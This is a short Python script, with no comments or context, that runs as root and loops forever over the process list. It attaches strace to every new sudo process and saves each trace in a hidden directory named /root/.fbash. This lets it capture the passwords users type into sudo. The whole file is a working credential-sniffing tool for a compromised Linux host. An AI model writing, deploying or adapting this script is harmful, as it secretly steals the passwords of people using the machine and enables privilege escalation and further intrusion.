import os,sys

path="/root/.fbash"
old_file_path="/root/.fbash/oldfiles"

if not os.path.exists(path): os.makedirs(path) 

sudo_pid_list=[]
    
        
while 1:
        a=os.popen("ps ax |grep sudo|grep -v grep")
        for i in a.readlines():
                pid=i.split()[0]
                if "sudo" in i and pid not in sudo_pid_list:
                        print i
                        sudo_pid_list.append(pid)
                        os.popen("strace -o %s -p %s &" % (path+"/"+pid,pid))

